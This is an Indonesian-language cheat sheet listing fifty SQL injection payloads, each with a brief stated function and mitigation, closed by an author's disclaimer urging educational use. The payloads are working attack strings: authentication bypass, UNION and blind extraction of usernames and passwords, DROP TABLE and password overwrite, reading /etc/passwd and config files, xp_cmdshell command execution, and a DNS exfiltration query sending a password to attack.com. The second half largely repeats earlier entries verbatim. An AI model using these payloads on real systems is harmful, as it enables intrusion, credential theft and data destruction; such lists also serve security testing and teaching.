# Kategori Payload

#### 1. Payload Deteksi Dasar
1. `'`
   - <b>Fungsi</b>: Mendeteksi kerentanan SQL Injection
   - <b>Mitigasi</b>: Input validation, prepared statements

2. `" OR 1=1--`
   - <b>Fungsi</b>: Mencoba bypass autentikasi
   - <b>Mitigasi</b>: Parameterized queries, input sanitization

3. `' OR '1'='1`
   - <b>Fungsi</b>: Eksploitasi logika boolean
   - <b>Mitigasi</b>: Strict input checking

#### 2. Payload Pengungkapan Informasi
4. `' UNION SELECT NULL, username, password FROM users--`
   - <b>Fungsi</b>: Ekstraksi kredensial
   - <b>Mitigasi</b>: 
     - Enkripsi data sensitif
     - Pembatasan hak akses database
     - Penggunaan ORM

5. `' UNION ALL SELECT 1, database(), user()--`
   - <b>Fungsi</b>: Mendapatkan informasi sistem database
   - <b>Mitigasi</b>: 
     - Sembunyikan pesan error
     - Batasi informasi yang ditampilkan

#### 3. Payload Time-Based Blind SQL Injection
6. `' AND SLEEP(5)--`
   - <b>Fungsi</b>: Mendeteksi kerentanan blind injection
   - <b>Mitigasi</b>: Batasi eksekusi query, monitoring waktu respon

7. `' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--`
   - <b>Fungsi</b>: Ekstraksi informasi database secara bertahap
   - <b>Mitigasi</b>: Pembatasan hak akses, enkripsi

#### 4. Payload Manipulasi Kondisional
8. `' OR 1=1 LIMIT 1--`
   - <b>Fungsi</b>: Bypass pembatasan query
   - <b>Mitigasi</b>: Validasi input ketat, prepared statements

9. `' OR SUBSTR(@@version,1,1)=5--`
   - <b>Fungsi</b>: Pengecekan versi database
   - <b>Mitigasi</b>: Sembunyikan informasi sistem

#### 5. Payload Eksekusi Perintah
10. `'; DROP TABLE users--`
    - <b>Fungsi</b>: Percobaan penghapusan tabel
    - <b>Mitigasi</b>: 
      - Batasi hak akses pengguna
      - Gunakan transaction management
      - Implementasi backup berkala

#### 6. Payload Berbasis Boolean
11. `' AND 1=0 UNION SELECT null, version()--`
    - <b>Fungsi</b>: Ekstraksi versi database
    - <b>Mitigasi</b>: Input sanitization, prepared statements

12. `' OR MID(DATABASE(),1,1) = 'a'--`
    - <b>Fungsi</b>: Enumerasi karakter database
    - <b>Mitigasi</b>: Batasi hak akses informasi sistem

#### 7. Payload Manipulasi Data
13. `'; UPDATE users SET password='hack' WHERE 1=1--`
    - <b>Fungsi</b>: Modifikasi data pengguna
    - <b>Mitigasi</b>: 
      - Enkripsi kredensial
      - Validasi input ketat
      - Pembatasan hak akses

14. `' UNION SELECT NULL, LOAD_FILE('/etc/passwd')--`
    - <b>Fungsi</b>: Membaca file sistem
    - <b>Mitigasi</b>: 
      - Nonaktifkan fungsi file system
      - Kontrol akses ketat

#### 8. Payload Injeksi Kondisional Lanjut
15. `' OR (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users LIMIT 1)=1--`
    - <b>Fungsi</b>: Deteksi akun spesifik
    - <b>Mitigasi</b>: 
      - Implementasi multi-factor authentication
      - Enkripsi data pengguna

16. `' AND (SELECT IF(SUBSTRING(password,1,1)='5',SLEEP(5),0) FROM users LIMIT 1)--`
    - <b>Fungsi</b>: Ekstraksi karakter password secara bertahap
    - <b>Mitigasi</b>: 
      - Hashing password dengan algoritma kuat
      - Pembatasan percobaan login

#### 9. Payload Manipulasi Sistem
17. `'; EXEC xp_cmdshell('ipconfig')--`
    - <b>Fungsi</b>: Eksekusi perintah sistem
    - <b>Mitigasi</b>: 
      - Nonaktifkan ekstensi berbahaya
      - Kontrol akses ketat
      - Sandbox lingkungan eksekusi

18. `' UNION SELECT 1, load_file('/var/www/html/config.php')--`
    - <b>Fungsi</b>: Pembacaan file konfigurasi
    - <b>Mitigasi</b>: 
      - Proteksi file konfigurasi
      - Batasi akses file sistem

#### 10. Payload Injeksi Lanjutan
19. `' OR 1=1 AND 1 IN (SELECT MIN(SUBSTRING(table_name,1,1)) FROM information_schema.tables WHERE table_schema=database())--`
    - <b>Fungsi</b>: Enumerasi struktur database
    - <b>Mitigasi</b>: 
      - Batasi akses information_schema
      - Implementasi principle of least privilege

20. `'; SELECT CONCAT(username, ':', password) FROM users--`
    - <b>Fungsi</b>: Ekstraksi kredensial dalam format terstruktur
    - <b>Mitigasi</b>: 
      - Enkripsi data sensitif
      - Hashing password dengan salt

#### 11. Payload Manipulasi Database
21. `' UNION SELECT NULL, TABLE_NAME, COLUMN_NAME FROM information_schema.columns--`
    - <b>Fungsi</b>: Pemetaan struktur database
    - <b>Mitigasi</b>: 
      - Kontrol akses ketat
      - Sembunyikan metadata sistem

22. `'; CREATE TABLE hacker_table (test VARCHAR(100))--`
    - <b>Fungsi</b>: Percobaan pembuatan tabel
    - <b>Mitigasi</b>: 
      - Batasi hak CREATE
      - Implementasi kontrol akses database

#### 12. Payload Injeksi Lanjutan
23. `' OR BINARY SUBSTRING(@@version,1,1)='5'--`
    - <b>Fungsi</b>: Deteksi versi database dengan case-sensitive
    - <b>Mitigasi</b>: 
      - Batasi informasi sistem
      - Implementasi input filtering

24. `'; SELECT CHAR(65,66,67) UNION SELECT database()--`
    - <b>Fungsi</b>: Manipulasi karakter dan informasi database
    - <b>Mitigasi</b>: 
      - Sanitasi input karakter
      - Kontrol akses ketat

#### 13. Payload Manipulasi Lanjutan
25. `' UNION SELECT NULL, BENCHMARK(1000000,MD5(CHAR(120)))--`
    - <b>Fungsi</b>: Uji responsivitas database
    - <b>Mitigasi</b>: 
      - Batasi eksekusi query kompleks
      - Implementasi timeout query

26. `'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attack.com\\share'))--`
    - <b>Fungsi</b>: Percobaan eksfiltrasi data melalui DNS
    - <b>Mitigasi</b>: 
      - Nonaktifkan fungsi load_file
      - Implementasi network segmentation

#### 14. Payload Injeksi Kondisional Ekstrem
27. `' OR (SELECT IF(SUBSTRING(USER(),1,1)='r',SLEEP(5),0))--`
    - <b>Fungsi</b>: Ekstraksi informasi pengguna database
    - <b>Mitigasi</b>: 
      - Enkripsi metadata sistem
      - Batasi informasi pengguna

28. `'; SELECT CONCAT_WS(':', username, password, email) FROM users LIMIT 5--`
    - <b>Fungsi</b>: Ekstraksi multiple kolom data
    - <b>Mitigasi</b>: 
      - Tokenisasi data sensitif
      - Implementasi column-level encryption

#### 15. Payload Manipulasi Sistem Lanjutan
29. `' UNION SELECT 1, CONVERT(INT, @@version)--`
    - <b>Fungsi</b>: Konversi dan ekstraksi informasi versi
    - <b>Mitigasi</b>: 
      - Sembunyikan detail sistem
      - Nonaktifkan informasi versi

30. `'; EXEC('SELECT * FROM ' + TABLE_NAME + ' WHERE 1=1')--`
    - <b>Fungsi</b>: Dinamis mengakses tabel
    - <b>Mitigasi</b>: 
      - Implementasi whitelist tabel
      - Kontrol akses dinamis

#### 16. Payload Injeksi Kompleks
31. `' OR 1=(SELECT COUNT(*) FROM users WHERE username LIKE 'admin%')--`
    - <b>Fungsi</b>: Deteksi akun admin
    - <b>Mitigasi</b>: Validasi akses ketat

32. `'; SELECT CONCAT(CHAR(65,66,67), database())--`
    - <b>Fungsi</b>: Manipulasi output database
    - <b>Mitigasi</b>: Input sanitization

#### 17. Payload Manipulasi Sistem
33. `' UNION SELECT NULL, LOAD_FILE('/proc/self/environ')--`
    - <b>Fungsi</b>: Pembacaan variabel sistem
    - <b>Mitigasi</b>: Batasi akses file sistem

34. `'; SELECT BENCHMARK(500000, MD5(CHAR(116,101,115,116)))--`
    - <b>Fungsi</b>: Uji responsivitas database
    - <b>Mitigasi</b>: Kontrol eksekusi query

#### 18. Payload Injeksi Kondisional
35. `' OR (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--`
    - <b>Fungsi</b>: Ekstraksi karakter password
    - <b>Mitigasi</b>: 
      - Hashing password bertingkat
      - Pembatasan percobaan

36. `'; SELECT CONCAT(username, ':', HEX(password)) FROM users--`
    - <b>Fungsi</b>: Konversi password ke heksadesimal
    - <b>Mitigasi</b>: 
      - Enkripsi data sensitif
      - Proteksi metadata

#### 19. Payload Manipulasi Database
37. `' UNION SELECT NULL, TABLE_NAME FROM information_schema.tables LIMIT 5--`
    - <b>Fungsi</b>: Enumerasi struktur database
    - <b>Mitigasi</b>: 
      - Batasi akses information_schema
      - Kontrol hak akses database

38. `'; CREATE TEMPORARY TABLE temp_table (test VARCHAR(100))--`
    - <b>Fungsi</b>: Percobaan pembuatan tabel sementara
    - <b>Mitigasi</b>: 
      - Batasi hak CREATE
      - Kontrol akses database

#### 20. Payload Injeksi Lanjutan
39. `' OR BINARY SUBSTRING(@@version,1,1)='5'--`
    - <b>Fungsi</b>: Deteksi versi database case-sensitive
    - <b>Mitigasi</b>: Sembunyikan informasi sistem

40. `'; SELECT CHAR(65,66,67) UNION SELECT database()--`
    - <b>Fungsi</b>: Manipulasi karakter dan informasi database
    - <b>Mitigasi</b>: Sanitasi input karakter

#### 21. Payload Manipulasi Sistem
41. `' UNION SELECT NULL, BENCHMARK(1000000,MD5(CHAR(120)))--`
    - <b>Fungsi</b>: Uji responsivitas database
    - <b>Mitigasi</b>: Batasi eksekusi query kompleks

42. `'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attack.com\\share'))--`
    - <b>Fungsi</b>: Percobaan eksfiltrasi data melalui DNS
    - <b>Mitigasi</b>: 
      - Nonaktifkan fungsi load_file
      - Implementasi network segmentation

#### 22. Payload Injeksi Kondisional Lanjutan
43. `' OR (SELECT IF(SUBSTRING(USER(),1,1)='r',SLEEP(5),0))--`
    - <b>Fungsi</b>: Ekstraksi informasi pengguna database
    - <b>Mitigasi</b>: Enkripsi metadata sistem

44. `'; SELECT CONCAT_WS(':', username, password, email) FROM users LIMIT 5--`
    - <b>Fungsi</b>: Ekstraksi multiple kolom data
    - <b>Mitigasi</b>: Tokenisasi data sensitif

#### 23. Payload Manipulasi Sistem Lanjutan
45. `' UNION SELECT 1, CONVERT(INT, @@version)--`
    - <b>Fungsi</b>: Konversi dan ekstraksi informasi versi
    - <b>Mitigasi</b>: Sembunyikan detail sistem

46. `'; EXEC('SELECT * FROM ' + TABLE_NAME + ' WHERE 1=1')--`
    - <b>Fungsi</b>: Dinamis mengakses tabel
    - <b>Mitigasi</b>: Implementasi whitelist tabel

#### 24. Payload Injeksi Lanjutan
47. `' OR 1=1 AND 1 IN (SELECT MIN(SUBSTRING(table_name,1,1)) FROM information_schema.tables WHERE table_schema=database())--`
    - <b>Fungsi</b>: Enumerasi struktur database
    - <b>Mitigasi</b>: Batasi akses information_schema

48. `'; SELECT CONCAT(username, ':', password) FROM users--`
    - <b>Fungsi</b>: Ekstraksi kredensial dalam format terstruktur
    - <b>Mitigasi</b>: Enkripsi data sensitif

#### 25. Payload Manipulasi Database
49. `' UNION SELECT NULL, TABLE_NAME, COLUMN_NAME FROM information_schema.columns--`
    - <b>Fungsi</b>: Pemetaan struktur database
    - <b>Mitigasi</b>: Kontrol akses ketat

50. `'; CREATE TABLE hacker_table (test VARCHAR(100))--`
    - <b>Fungsi</b>: Percobaan pembuatan tabel
    - <b>Mitigasi</b>: Batasi hak CREATE
    
---

# Disclaimer

<b>Harap gunakan secara bijak, jadikan bahan belajar dan tidak untuk melakukan aktivitas ilegal. Segala resiko yang dilakukan, saya Andwisakti tidak ikut bertanggung jawab.</b>
